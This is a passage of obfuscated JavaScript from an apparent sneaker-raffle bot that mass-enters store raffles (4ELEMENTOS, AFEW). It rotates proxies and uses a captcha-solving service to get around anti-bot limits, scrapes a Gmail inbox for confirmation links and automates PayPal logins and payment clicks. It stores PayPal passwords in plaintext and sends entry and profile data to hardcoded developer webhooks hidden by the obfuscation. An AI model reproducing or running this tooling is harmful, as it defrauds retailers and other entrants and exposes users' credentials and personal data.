            return _0x17cf89[_0x2f49d2['Option']];
        console['clear'](), console['log']('Adding\x20a\x20new\x20account\x0aEnter\x20your\x20paypal\x27s\x20email:\x0a');
        let _0x15ed63 = {}, _0x284620 = await _0x13036b['get']('Email');
        _0x15ed63['Email'] = _0x284620['Email'];
        var _0x184998 = Math['round'](Math['random']() * (_0x3e1a90['length'] - 0x1));
        _0x15ed63['Proxy'] = _0x3e1a90[_0x184998], console['clear'](), console['log']('Enter\x20your\x20paypal\x27s\x20password:\x0a');
        let _0x5a8417 = await _0x13036b['get']('Password');
        return _0x15ed63['Password'] = _0x5a8417['Password'], _0x467c3c['appendFileSync']('../accounts/paypal.csv', '\x0a' + _0x15ed63['Email'] + ',' + _0x15ed63['Password'] + ',' + _0x15ed63['Proxy']), _0x15ed63;
    }
    let _0x3ae543 = await _0x3341ad();
    var _0x2b0097 = [];
    console['clear'](), console['log']('How\x20many\x20links\x20would\x20you\x20like\x20to\x20verify\x20on\x20this\x20paypal?');
    let _0x1535d3 = await _0x13036b['get']('Amount'), _0x1c8b42 = _0x1535d3['Amount'];
    async function _0x82468() {
        let _0x56fd0b = 0x0;
        var _0x1b3584 = new _0x3a8843({
            'user': _0x5b5c1b['masterMail'],
            'password': _0x5b5c1b['masterPassword'],
            'host': 'imap.gmail.com',
            'port': 0x3e1,
            'tls': !![],
            'autotls': 'always'
        });
        function _0x588a3e(_0x43e3d0) {
            _0x1b3584['openBox']('INBOX', ![], _0x43e3d0);
        }
        _0x1b3584['once']('ready', function () {
            _0x588a3e(function (_0x4bbb89, _0x20e0eb) {
                console['clear'](), console['log']('Looking\x20For\x20Links');
                if (_0x4bbb89)
                    throw _0x4bbb89;
                _0x1b3584['seq']['search']([
                    'UNSEEN',
                    [
                        'SUBJECT',
                        'PayPal'
                    ]
                ], function (_0x3b3388, _0x5ac6d8) {
                    if (!_0x5ac6d8 || !_0x5ac6d8['length'])
                        console['log'](_0x235b96() + '\x20[' + _0x4b84db + ']\x20No\x20mails\x20found'), _0x1b3584['end']();
                    else {
                        _0x5ac6d8 = _0x5ac6d8['slice'](0x0, _0x1c8b42);
                        var _0x543bf6 = _0x1b3584['seq']['fetch'](_0x5ac6d8, {
                            'bodies': '',
                            'markSeen': !![]
                        });
                        _0x543bf6['on']('message', function (_0x47aeaa, _0x44f067) {
                            var _0x1c2c23 = '(#' + _0x44f067 + ')\x20';
                            _0x47aeaa['on']('body', function (_0x43bb37, _0x142870) {
                                _0xbb5a33(_0x43bb37, (_0x77301a, _0x58cf3d) => {
                                    if (_0x58cf3d['subject'] == 'PayPal\x20Konto\x20bestätigen' || _0x58cf3d['subject'] == 'Confirm\x20your\x20PayPal\x20account') {
                                        mes = _0x58cf3d['text']['split']('[')[0x2];
                                        var _0x1863e4 = mes['split'](']')[0x0];
                                        _0x2b0097['push'](_0x1863e4);
                                    }
                                });
                            }), _0x47aeaa['once']('end', function () {
                                _0x56fd0b++;
                            });
                        }), _0x543bf6['once']('error', function (_0x3efeec) {
                            console['log']('Fetch\x20error:\x20' + _0x3efeec);
                        }), _0x543bf6['once']('end', function () {
                            _0x1b3584['end']();
                        });
                    }
                });
            });
        }), _0x1b3584['once']('error', function (_0x5c9d2e) {
            console['log'](_0x1ee8dd['red'](_0x5c9d2e['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
        }), _0x1b3584['once']('end', async function () {
        }), _0x1b3584['connect']();
    }
    try {
        _0x82468(), await _0x101cd5(0xfa0), console['log']('Found\x20' + _0x2b0097['length'] + '\x20Links\x20in\x20Mailbox');
    } catch {
        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x101cd5(0xfa0);
    }
    var _0x9dbb0c;
    _0x18a4ea('' + _0x4b84db);
    var _0x49a667 = _0x3ae543['Proxy']['split'](':'), _0x3e33e0;
    try {
        _0x3e33e0 = await _0x23c50c['launch']({
            'userDataDir': 'sessions/' + _0x3ae543['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x49a667[0x0] + ':' + _0x49a667[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    } catch {
        _0x3e33e0 = await _0x23c50c['launch']({
            'userDataDir': 'sessions/' + _0x3ae543['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x49a667[0x0] + ':' + _0x49a667[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    }
    try {
        console['log'](_0x235b96() + '\x20[' + _0x4b84db + ']\x20Getting\x20Session');
        const _0x3a80f2 = await _0x3e33e0['newPage']();
        await _0x3a80f2['authenticate']({
            'username': '' + _0x49a667[0x2],
            'password': '' + _0x49a667[0x3]
        }), await _0x3a80f2['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x3a80f2['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x235b96() + '\x20[' + _0x4b84db + ']\x20Logging\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x3a80f2['waitForSelector']('#email');
            let _0x5df0f9 = await _0x3a80f2['$eval']('#email', _0x2924f6 => _0x2924f6['getAttribute']('value'));
            if (_0x5df0f9 == '') {
                await _0x3a80f2['type']('#email', _0x3ae543['Email']), await _0x101cd5(0x1d3);
                let _0x540202 = await _0x3a80f2['$']('#splitPassword');
                _0x540202 && (await _0x3a80f2['click']('#btnNext'), await _0x101cd5(0xa28)), await _0x3a80f2['type']('#password', _0x3ae543['Password']), await _0x101cd5(0x35c), await _0x3a80f2['click']('#btnLogin');
            } else
                await _0x3a80f2['type']('#password', _0x3ae543['Password']), await _0x101cd5(0x35c), await _0x3a80f2['click']('#btnLogin');
            await _0x3a80f2['waitForSelector']('#reactContainer__balance', { 'timeout': 0x493e0 }), console['log'](_0x235b96() + '\x20[' + _0x4b84db + ']\x20Successfully\x20logged\x20in'), await _0x101cd5(0x2710);
        } catch (_0x172cd4) {
            throw new Error('Login\x20session\x20expired\x20' + _0x172cd4);
        }
        for (var _0x5c134e = 0x0; _0x5c134e < _0x2b0097['length']; _0x5c134e++) {
            console['log'](_0x235b96() + '\x20[' + _0x4b84db + ']\x20Task\x20' + (_0x5c134e + 0x1) + '\x20:\x20Starting\x20Verification'), _0x18a4ea(_0x4b84db + '\x20Task\x20' + (_0x5c134e + 0x1) + '\x20/\x20' + _0x2b0097['length']);
            const _0x294913 = await _0x3e33e0['newPage']();
            await _0x294913['goto']('' + _0x2b0097[_0x5c134e], { 'waitUntil': 'networkidle2' }), await _0x101cd5(0xbb8);
            try {
                const _0x165244 = await _0x294913['$']('#challenge-heading');
                _0x165244 && (console['log'](_0x235b96() + '\x20[' + _0x4b84db + ']\x20Task\x20' + (_0x5c134e + 0x1) + '\x20:\x20' + _0x1ee8dd['yellow']('2FA\x20Required')), await _0x294913['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0x101cd5(0x9c40), await _0x294913['waitForSelector']('#payment-submit-btn'), await _0x294913['$eval']('#payment-submit-btn', _0x796697 => _0x796697['click']()), await _0x294913['click']('#payment-submit-btn');
                try {
                    await _0x294913['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x101cd5(0x5dc), console['log'](_0x1ee8dd['green'](_0x235b96() + '\x20[' + _0x4b84db + ']\x20Task\x20' + (_0x5c134e + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x5ca06b) {
                    _0xfc1bcc = 'yes';
                    throw new Error('Payment\x20Rejected:\x20' + _0x5ca06b['message']);
                } finally {
                    if (_0xfc1bcc == 'yes' && _0x284a4c != 0x2) {
                        console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0x4b84db['name'] + ']\x20Task\x20' + (_0x5c134e + 0x1) + '\x20:\x20Retrying\x20(' + _0x284a4c + '\x20/\x205)')), _0x5c134e = _0x5c134e - 0x1, _0x284a4c = _0x284a4c + 0x1;
                        continue;
                    }
                    _0xfc1bcc == 'yes' && _0x284a4c >= 0x2 && (_0x3802e1(csv[_0x5c134e], _0x4b84db), _0xfc1bcc = 'no', _0x284a4c = 0x0), await _0x294913['close'](), await _0x101cd5(0x4650);
                }
            } catch (_0x1ae56c) {
                console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0x4b84db + ']\x20Task\x20' + (_0x5c134e + 0x1) + '\x20:\x20' + _0x1ae56c));
            }
        }
    } catch (_0x24e888) {
        console['log'](_0x1ee8dd['red']('' + _0x24e888));
    } finally {
        await _0x3e33e0['close']();
    }
}
const _0x2db3d = [
    {
        'name': '4ELEMENTOS',
        'modules': [
            {
                'name': '4ELEMENTOS\x20Raffle\x20Entries',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0xc1d3d6, _0x487161, _0x3d7d70) {
                    _0x23c50c['use'](_0x9505fd()), _0x23c50c['use'](_0x1b94bb({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5b5c1b['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x58e79a = 0x0; _0x58e79a < _0x487161['length']; _0x58e79a++) {
                        if (_0x482010 != 'yes')
                            var _0x482010 = '', _0x5281b6 = 0x0;
                        var _0x28f407;
                        try {
                            await _0x15925d(_0x487161, _0x58e79a);
                        } catch {
                            _0x482010 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x18a4ea(_0xc1d3d6['name'] + '\x20Task\x20' + (_0x58e79a + 0x1) + '\x20/\x20' + _0x487161['length'] + '\x20||\x20File:\x20' + _0x2e7789 + '\x20Proxies:\x20' + _0x34cb85);
                        var _0x3c4e4f = [
                            '40',
                            '40,5',
                            '41',
                            '42',
                            '42,5',
                            '43',
                            '44',
                            '45',
                            '45,5',
                            '46',
                            '47',
                            '47,5',
                            '48'
                        ], _0xed9a31 = Math['round'](Math['random']() * (_0x3c4e4f['length'] - 0x1));
                        _0x487161[_0x58e79a]['Size'] == 'RANDOM' && (_0x487161[_0x58e79a]['Size'] = _0x3c4e4f[_0xed9a31]);
                        var _0x516e01 = Math['round'](Math['random']() * (_0x3d7d70['length'] - 0x1)), _0x499de8 = _0x3d7d70[_0x516e01]['split'](':'), _0x34315c;
                        try {
                            _0x34315c = await _0x23c50c['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x499de8[0x0] + ':' + _0x499de8[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x34315c = await _0x23c50c['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x499de8[0x0] + ':' + _0x499de8[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            console['log'](_0x235b96() + '\x20[' + _0xc1d3d6['name'] + ']\x20Task\x20' + (_0x58e79a + 0x1) + '\x20:\x20Getting\x20Session');
                            const _0x281503 = await _0x34315c['newPage']();
                            await _0x281503['authenticate']({
                                'username': '' + _0x499de8[0x2],
                                'password': '' + _0x499de8[0x3]
                            }), await _0x281503['setRequestInterception'](!![]), _0x281503['on']('request', _0x15d1a1 => {
                                _0x15d1a1['resourceType']() === 'image' || _0x15d1a1['resourceType']() === 'font' || _0x15d1a1['resourceType']() === 'media' ? _0x15d1a1['abort']() : _0x15d1a1['continue']();
                            }), await _0x281503['goto'](_0x487161[_0x58e79a]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x235b96() + '\x20[' + _0xc1d3d6['name'] + ']\x20Task\x20' + (_0x58e79a + 0x1) + '\x20:\x20Starting\x20Entry'), await _0x281503['waitForSelector']('#accept-all-gdpr'), await _0x281503['click']('#accept-all-gdpr'), await _0x281503['waitForSelector']('#raffles-product'), await _0x101cd5(0x3e8), await _0x281503['$eval']('#raffles-product', _0x19a90e => _0x19a90e['click']()), await _0x101cd5(0x1388), await _0x281503['waitForSelector']('.fancybox-inner\x20>\x20iframe');
                            var _0x324522 = await _0x281503['$']('.fancybox-inner\x20>\x20iframe'), _0x596253 = await _0x324522['contentFrame']();
                            console['log'](_0x235b96() + '\x20[' + _0xc1d3d6['name'] + ']\x20Task\x20' + (_0x58e79a + 0x1) + '\x20:\x20Checking\x20Information'), await _0x596253['waitForSelector']('input[name=\x22sm-form-email\x22]'), await _0x101cd5(0x1f4), await _0x596253['type']('input[name=\x22sm-form-email\x22]', _0x487161[_0x58e79a]['Email']), await _0x101cd5(0xc8), await _0x596253['type']('input[name=\x22sm-form-name\x22]', _0x487161[_0x58e79a]['FirstName'] + '\x20' + _0x487161[_0x58e79a]['LastName']), await _0x101cd5(0xc8), await _0x596253['type']('input[name=\x22sm-form-street\x22]', _0x487161[_0x58e79a]['Address1'] + '\x20' + _0x487161[_0x58e79a]['HouseNumber'] + '\x20' + _0x487161[_0x58e79a]['Address2']), await _0x101cd5(0xc8), await _0x596253['type']('input[name=\x22sm-form-city\x22]', _0x487161[_0x58e79a]['City']), await _0x101cd5(0xc8), await _0x596253['type']('input[name=\x22sm-form-province\x22]', _0x487161[_0x58e79a]['State']), await _0x101cd5(0xc8), await _0x596253['type']('input[name=\x22sm-form-zip\x22]', _0x487161[_0x58e79a]['Zip']), await _0x101cd5(0xc8), await _0x596253['type']('input[name=\x22sm-form-country\x22]', _0x487161[_0x58e79a]['Country']), await _0x101cd5(0xc8), await _0x596253['type']('input[name=\x22sm-form-phone\x22]', _0x487161[_0x58e79a]['Phone']), await _0x101cd5(0xc8), await _0x596253['type']('input[name=\x22sm-cst.instagram_user\x22]', _0x487161[_0x58e79a]['Follower']), await _0x101cd5(0xc8), await _0x596253['type']('input[name=\x22sm-cst.size\x22]', _0x487161[_0x58e79a]['Size']), await _0x101cd5(0x1f4), await _0x596253['click']('.icheckbox_simple-custom.icheckbox--CONSENT'), await _0x101cd5(0x1f4), await _0x596253['click']('.icheckbox_simple-custom'), await _0x101cd5(0x1f4), console['log'](_0x235b96() + '\x20[' + _0xc1d3d6['name'] + ']\x20Task\x20' + (_0x58e79a + 0x1) + '\x20:\x20Sending\x20Request'), await _0x596253['$eval']('form', _0xda99c7 => _0xda99c7['submit']()), console['log'](_0x1ee8dd['green'](_0x235b96() + '\x20[' + _0xc1d3d6['name'] + ']\x20Task\x20' + (_0x58e79a + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x482010 = '';
                            var _0x53ae03 = await _0x42c912(_0x487161[_0x58e79a], _0xc1d3d6, 'dev', ![]), _0x58ae37 = await _0x42c912(_0x487161[_0x58e79a], _0xc1d3d6, 'pub', ![]);
                            const _0x3e6ec7 = {
                                'succesDEVMSG': { 'embeds': [_0x53ae03] },
                                'succesPUBMSG': { 'embeds': [_0x58ae37] }
                            };
                            try {
                                _0x5b5c1b['webhook'] != undefined && _0x5b5c1b['webhook'] != '' && await _0x3b1b09(_0x5b5c1b['webhook'], _0x3e6ec7['succesDEVMSG']), await _0x101cd5(0xc8), await _0x3b1b09(_0x5748ab, _0x3e6ec7['succesDEVMSG']), await _0x101cd5(0xc8), await _0x3b1b09(_0x155517, _0x3e6ec7['succesPUBMSG']);
                            } catch (_0x2c088f) {
                                console['log'](_0x1ee8dd['yellow'](_0x235b96() + '\x20[' + _0xc1d3d6['name'] + ']\x20Task\x20' + (_0x58e79a + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x2c088f));
                            }
                        } catch (_0x2acdbf) {
                            console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0xc1d3d6['name'] + ']\x20Task\x20' + (_0x58e79a + 0x1) + '\x20:\x20' + _0x2acdbf)), _0x28f407 = '' + _0x2acdbf;
                            var _0x3b3f03 = await _0x42c912(_0x487161[_0x58e79a], _0xc1d3d6, 'dev', !![], _0x28f407), _0x53ae03 = await _0x42c912(_0x487161[_0x58e79a], _0xc1d3d6, 'dev', ![]), _0x58ae37 = await _0x42c912(_0x487161[_0x58e79a], _0xc1d3d6, 'pub', ![]);
                            const _0x436952 = {
                                'succesDEVMSG': { 'embeds': [_0x53ae03] },
                                'succesPUBMSG': { 'embeds': [_0x58ae37] }
                            };
                            _0x436952['errorDEV'] = { 'embeds': [_0x3b3f03] }, _0x5b5c1b['webhook'] != undefined && _0x5b5c1b['webhook'] != '' && await _0x3b1b09(_0x5b5c1b['webhook'], _0x436952['errorDEV']), await _0x3b1b09(_0x57f30c, _0x436952['errorDEV']), _0x2acdbf != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x482010 = 'yes');
                        } finally {
                            _0x34315c['close']();
                            if (_0x482010 == 'yes' && _0x5281b6 != 0x5 && _0x28f407 != 'Size\x20Not\x20Found') {
                                console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0xc1d3d6['name'] + ']\x20Task\x20' + (_0x58e79a + 0x1) + '\x20:\x20Retrying\x20(' + _0x5281b6 + '\x20/\x205)\x20')), _0x58e79a = _0x58e79a - 0x1, _0x5281b6 = _0x5281b6 + 0x1;
                                continue;
                            }
                            _0x482010 == 'yes' && _0x5281b6 >= 0x5 && (_0x3802e1(_0x487161[_0x58e79a], _0xc1d3d6), _0x482010 = 'no', _0x5281b6 = 0x0), console['log'](_0x235b96() + '\x20[' + _0xc1d3d6['name'] + ']\x20Waiting\x20for\x20' + _0x5b5c1b['delay'] + '\x20ms'), await _0x101cd5(_0x5b5c1b['delay']);
                        }
                    }
                }
            },
            {
                'name': '4ELEMENTOS\x20Link\x20Verification',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x2930ab, _0x551105) {
                    var _0x27d8f4 = [];
                    async function _0x3b7d43() {
                        var _0x30984 = new _0x3a8843({
                            'user': _0x5b5c1b['masterMail'],
                            'password': _0x5b5c1b['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x458cbb(_0x1e5dee) {
                            _0x30984['openBox']('INBOX', ![], _0x1e5dee);
                        }
                        _0x30984['once']('ready', function () {
                            _0x458cbb(function (_0x178b73, _0x1c4a20) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x178b73)
                                    throw _0x178b73;
                                _0x30984['seq']['search'](['UNSEEN'], function (_0xd48fb4, _0x110699) {
                                    if (!_0x110699 || !_0x110699['length'])
                                        console['log'](_0x235b96() + '\x20[' + _0x2930ab['name'] + ']\x20No\x20mails\x20found'), _0x30984['end']();
                                    else {
                                        var _0x381809 = _0x30984['seq']['fetch'](_0x110699, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x381809['on']('message', function (_0x496509, _0x5bc977) {
                                            var _0x2689fe = '(#' + _0x5bc977 + ')\x20';
                                            _0x496509['on']('body', function (_0x142be6, _0x1713cf) {
                                                _0xbb5a33(_0x142be6, (_0x541251, _0x3e897b) => {
                                                    if (_0x3e897b['subject'] == 'Confirm\x20your\x20subscription\x20to\x20the\x20Raffle\x20||\x20Confirma\x20tu\x20suscripción\x20al\x20Raffle') {
                                                        var _0x1b654a = _0x3e897b['html']['split']('\x0a');
                                                        for (var _0x22aecf = 0x0; _0x22aecf < _0x1b654a['length']; _0x22aecf++) {
                                                            if (_0x1b654a[_0x22aecf]['includes']('salesmanago') && _0x1b654a[_0x22aecf]['includes']('<td') && _0x1b654a[_0x22aecf]['includes']('href')) {
                                                                var _0x16239a = _0x1b654a[_0x22aecf]['split']('href=\x22'), _0x45335c = _0x16239a[0x1]['split']('\x22')[0x0];
                                                                _0x27d8f4['push'](_0x45335c);
                                                                break;
                                                            }
                                                        }
                                                    }
                                                });
                                            }), _0x496509['once']('end', function () {
                                            });
                                        }), _0x381809['once']('error', function (_0x597376) {
                                            console['log']('Fetch\x20error:\x20' + _0x597376);
                                        }), _0x381809['once']('end', function () {
                                            _0x30984['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x30984['once']('error', function (_0x6702d2) {
                            console['log'](_0x1ee8dd['red'](_0x6702d2['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0x30984['once']('end', async function () {
                        }), _0x30984['connect']();
                    }
                    async function _0x138eee(_0x177453, _0x18cca1, _0x5d6d3e) {
                        for (var _0x316564 = 0x0; _0x316564 < _0x18cca1['length']; _0x316564++) {
                            async function _0x3b30e5(_0x44f0b4, _0x300675, _0x56bc5d, _0x325fa3, _0x21762a) {
                                var _0x1db223, _0x56e930 = {}, _0x52e75f = [], _0x5b0bf8 = {}, _0x426364 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0xa9f17e = Math['round'](Math['random']() * (_0x426364['length'] - 0x1));
                                _0x325fa3[_0x44f0b4]['Size'] == 'RANDOM' && (_0x325fa3[_0x44f0b4]['Size'] = _0x426364[_0xa9f17e]);
                                !_0x325fa3 && (_0x325fa3 = {});
                                if (_0x5b5c1b['useRandomProxy'] = ![])
                                    var _0x42fc21 = _0x21762a[_0x44f0b4]['split'](':');
                                else
                                    var _0x55b914 = Math['round'](Math['random']() * (_0x21762a['length'] - 0x1)), _0x42fc21 = _0x21762a[_0x55b914]['split'](':');
                                var _0x5f0e43 = {
                                    'jar': _0x160c4b,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x56bc5d['url'],
                                    'headers': _0x56bc5d['headers'],
                                    'body': JSON['stringify'](_0x56e930),
                                    'proxy': 'http://' + _0x42fc21[0x2] + ':' + _0x42fc21[0x3] + '@' + _0x42fc21[0x0] + ':' + _0x42fc21[0x1]
                                };
                                return _0x300675 != 'ver' && (_0x5f0e43['url'] = _0x56bc5d['url'], _0x5f0e43['headers'] = _0x56bc5d['headers']), _0x300675 == 'ver' && (_0x5f0e43['method'] = 'GET', _0x5f0e43['url'] = _0x325fa3[_0x44f0b4]), new Promise(function (_0x2baf66, _0x14ddc7) {
                                    callback = async (_0x1523ce, _0x5297cf, _0x32ef53) => {
                                        if (!_0x1523ce && _0x5297cf['statusCode'] == 0xca || !_0x1523ce && _0x5297cf['statusCode'] == 0xc8) {
                                            if (_0x300675 != 'ver') {
                                                var _0x1d4c43 = await _0x42c912(_0x325fa3[_0x44f0b4], _0x56bc5d, 'dev', ![]), _0x13d9ec = await _0x42c912(_0x325fa3[_0x44f0b4], _0x56bc5d, 'pub', ![]);
                                                const _0x4a5070 = {
                                                    'succesDEVMSG': { 'embeds': [_0x1d4c43] },
                                                    'succesPUBMSG': { 'embeds': [_0x13d9ec] }
                                                };
                                                if (_0x5b5c1b['webhook'] != undefined && _0x5b5c1b['webhook'] != '')
                                                    try {
                                                        await _0x3b1b09(_0x5b5c1b['webhook'], _0x4a5070['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x101cd5(0xc8), await _0x3b1b09(_0x5748ab, _0x4a5070['succesDEVMSG']), await _0x101cd5(0xc8);
                                                try {
                                                    await _0x3b1b09(_0x155517, _0x4a5070['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x30fd17(_0x325fa3[_0x44f0b4], _0x56bc5d);
                                            }
                                            _0x2baf66(console['log'](_0x1ee8dd['green'](_0x235b96() + '\x20[' + _0x56bc5d['name'] + ']\x20Task\x20' + (_0x44f0b4 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x300675 != 'ver') {
                                                var _0x50eaf4 = '' + _0x1523ce, _0x561b29 = await _0x42c912(_0x325fa3[_0x44f0b4], _0x56bc5d, 'dev', !![], _0x50eaf4), _0x38700e = {};
                                                _0x38700e['errorDEV'] = { 'embeds': [_0x561b29] }, _0x3802e1(_0x325fa3[_0x44f0b4], _0x56bc5d), _0x5b5c1b['webhook'] != undefined && _0x5b5c1b['webhook'] != '' && await _0x3b1b09(_0x5b5c1b['webhook'], _0x38700e['errorDEV']), await _0x3b1b09(_0x57f30c, _0x38700e['errorDEV']);
                                            }
                                            _0x14ddc7(console['log'](_0x1ee8dd['red'](_0x235b96() + '\x20[' + _0x56bc5d['name'] + ']\x20Task\x20' + (_0x44f0b4 + 0x1) + ':\x20' + _0x1523ce)));
                                        }
                                    };
                                    try {
                                        _0x300675 != 'ver' ? console['log'](_0x235b96() + '\x20[' + _0x56bc5d['name'] + ']\x20Task\x20' + (_0x44f0b4 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x56e930['data']['attributes']['email']) : console['log'](_0x235b96() + '\x20[' + _0x56bc5d['name'] + ']\x20Task\x20' + (_0x44f0b4 + 0x1) + ':\x20Fetching\x20Response'), _0x29b460(_0x5f0e43, callback);
                                    } catch (_0x999eb7) {
                                        console['log'](_0x235b96() + '\x20Task\x20' + (_0x44f0b4 + 0x1) + ':\x20' + _0x999eb7);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x3b30e5(_0x316564, 'ver', _0x177453, _0x18cca1, _0x5d6d3e), console['log'](_0x235b96() + '\x20[' + _0x177453['name'] + ']\x20Sleeping\x20for\x20' + _0x5b5c1b['delay'] + '\x20ms'), await _0x101cd5(_0x5b5c1b['delay']);
                            } catch (_0x2de3fc) {
                            }
                        }
                    }
                    try {
                        _0x3b7d43(), await _0x101cd5(0xfa0), console['log']('Found\x20' + _0x27d8f4['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x138eee(_0x2930ab, _0x27d8f4, _0x551105);
                }
            }
        ]
    },
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png',
            'function': async function (_0x40e4d9, _0x3d2e5f, _0x5cfc05) {
                for (var _0x5017df = 0x0; _0x5017df < _0x3d2e5f['length']; _0x5017df++) {
                    _0x5b5c1b['AfewDelay'] = _0x5b5c1b['delay'];
                    var _0x486063;
                    if (_0x21d7b6 != 'yes')
                        var _0x21d7b6 = '', _0x2a445f = 0x0;
                    var _0x18df0f = _0x3d2e5f[_0x5017df]['Url'], _0x5a7ada = _0x3d2e5f[_0x5017df];
                    _0x18a4ea(_0x40e4d9['name'] + '\x20Task\x20' + (_0x5017df + 0x1) + '\x20/\x20' + _0x3d2e5f['length'] + '\x20||\x20File:\x20' + _0x2e7789 + '\x20Proxies:\x20' + _0x34cb85);
                    try {
                        await _0x15925d(_0x3d2e5f, _0x5017df);
                    } catch {
                        _0x21d7b6 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0xdc4064(_0x3f34df) {
                        const _0x1ff225 = _0x467c3c['readFileSync']('../successful-tasks.csv', 'utf8'), _0x42a8d4 = _0x416c9b['parse'](_0x1ff225, { 'header': !![] })['data'];
                        let _0x21f690 = ![];
                        for (var _0x2a27d6 of _0x42a8d4) {
                            if (_0x2a27d6['Url'] == _0x3f34df['Url'] && _0x2a27d6['Email'] == _0x3f34df['Email']) {
                                _0x21f690 = !![];
                                break;
                            }
                        }
                        return _0x21f690;
                    }
                    if (await _0xdc4064(_0x3d2e5f[_0x5017df]) == !![]) {
                        console['log'](_0x235b96() + '\x20[' + _0x40e4d9['name'] + ']\x20Task\x20' + (_0x5017df + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x121d46 = await _0x42c912(_0x3d2e5f[_0x5017df], _0x40e4d9, 'dev', ![]), _0x2007cc = await _0x42c912(_0x3d2e5f[_0x5017df], _0x40e4d9, 'pub', ![]);
                    const _0x35b4c6 = {
                        'succesDEVMSG': { 'embeds': [_0x121d46] },
                        'succesPUBMSG': { 'embeds': [_0x2007cc] }
                    };
                    if (_0x3d2e5f[_0x5017df]['Email'] == '' || _0x3d2e5f[_0x5017df]['FirstName'] == '' || _0x3d2e5f[_0x5017df]['LastName'] == '' || _0x3d2e5f[_0x5017df]['Country'] == '' || _0x3d2e5f[_0x5017df]['Size'] == '' || _0x3d2e5f[_0x5017df]['Address1'] == '' || _0x3d2e5f[_0x5017df]['Zip'] == '') {
                        console['log'](_0x235b96() + '\x20[' + _0x40e4d9['name'] + ']\x20Task\x20' + (_0x5017df + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x5b5c1b['useRandomProxy'] = ![])
                        var _0x10c939 = _0x5cfc05[_0x5017df]['split'](':');
                    else
                        var _0x17abfb = Math['round'](Math['random']() * (_0x5cfc05['length'] - 0x1)), _0x10c939 = _0x5cfc05[_0x17abfb]['split'](':');
                    var _0x30ea8b;
                    try {
                        _0x30ea8b = await _0x23c50c['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
